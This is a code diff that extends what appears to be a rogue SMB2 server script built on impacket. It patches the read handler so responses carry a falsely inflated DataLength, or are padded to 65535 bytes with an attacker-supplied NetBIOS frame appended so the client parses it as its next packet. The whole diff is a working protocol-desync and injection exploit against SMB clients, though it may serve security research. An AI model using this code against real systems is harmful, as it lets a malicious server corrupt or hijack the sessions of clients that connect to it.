@@ -45,17 +45,35 @@ _ORIG_QFI = SMB2Commands.smb2QueryInfo if hasattr(SMB2Commands, "smb2QueryInfo")
 DLEN = 0
 if "--dlen" in sys.argv:
     DLEN = int(sys.argv[sys.argv.index("--dlen") + 1])
+INJECT = b""
+if "--inject" in sys.argv:
+    INJECT = open(sys.argv[sys.argv.index("--inject") + 1], "rb").read()
 
 _ORIG_RD = SMB2Commands.smb2Read
 
 
 def patched_rd(connId, smbServer, recvPacket):
     res = _ORIG_RD(connId, smbServer, recvPacket)
-    if DLEN:
+    if DLEN or INJECT:
         try:
             resp = res[0][0]
-            real = len(resp['Buffer'])
-            if real:
+            raw = resp['Buffer']
+            if not isinstance(raw, (bytes, bytearray)):
+                raw = raw.getData()
+            buf = bytearray(raw)
+            real = len(buf)
+            if INJECT and real:
+                # desync injection: client requested 65535; it consumes exactly
+                # 65535 bytes of the reply; anything beyond stays in the socket
+                # and is parsed as the NEXT PDU. Pad the payload to 65535 then
+                # append the crafted NetBIOS frame.
+                REQ = 65535
+                buf = buf + b"\x00" * max(0, REQ - len(buf)) + INJECT
+                resp['Buffer'] = bytes(buf)
+                resp['DataLength'] = len(buf)
+                print('READ inject: real=%d padded+injected total=%d (frame %dB at socket offset %d)'
+                      % (real, len(buf), len(INJECT), REQ), flush=True)
+            elif DLEN and real:
                 resp['DataLength'] = real + DLEN
                 print('READ patch: real=%d declared=%d' % (real, real + DLEN), flush=True)
         except Exception as e:
@@ -63,7 +81,7 @@ def patched_rd(connId, smbServer, recvPacket):
     return res
 
 
-if DLEN:
+if DLEN or INJECT:
     SMB2Commands.smb2Read = staticmethod(patched_rd)
 
 
